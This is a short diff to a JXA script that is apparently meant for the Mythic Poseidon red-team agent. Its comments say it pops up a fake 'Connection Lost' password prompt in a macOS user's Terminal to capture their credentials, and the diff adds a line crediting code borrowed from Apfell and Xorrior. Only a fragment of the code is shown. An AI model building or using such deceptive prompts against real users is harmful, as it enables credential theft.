@@ -1,5 +1,7 @@
 // This is a handy JXA script for use with Mythic Poseidon, since it currently does not have password prompting functionality
 // Inside your agent just run "jxa" and paste the below code to generate a prompt to the user via their 'Terminal' app
+//
+// Most of this code was borrowed from Apfell's prompt funciton, with some also coming from Xorrior's prompt persistence
 
 let config = [];
 let title = "Connection Lost";
